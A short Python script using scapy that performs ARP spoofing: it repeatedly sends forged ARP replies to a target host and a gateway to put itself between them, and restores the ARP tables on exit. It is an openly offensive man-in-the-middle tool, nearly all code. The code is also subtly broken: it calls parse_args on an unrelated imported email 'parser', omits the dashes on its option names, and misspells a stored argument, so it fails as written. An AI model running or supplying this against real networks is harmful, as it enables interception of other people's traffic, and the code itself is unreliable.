from email import parser
import scapy.all as scapy
import argparse
import sys
import time

def get_arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("t", "--target", dest="target", help="Specify target IP")
    parse.add_argument("g", "--gateway", dest="gatewey", help="Specify spoof IP")
    return parser.parse_args()

def get_mac(ip):
    arp_paket = scapy.ARP(pdst=ip)
    broadcast_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_paket/arp_paket
    list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return list[0][1].hwsrc

def restore(destino_ip, source_ip):
    destino_mac = get_mac(destino_ip)
    source_mac = get_mac(source_ip)
    packt = scapy.ARP(op=2, pdst=destino_ip, hwdst=destino_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packt, 4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packt, verbose=False)

arguments = get_arguments()
sent_packets = 0
try:
    while True:
        spoof(arguments.target, arguments.gateway)
        spoof(arguments.gateway, arguments.target)
        sent_packets+=2
        print("\r[+] Sent packets: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway, arguments.target)
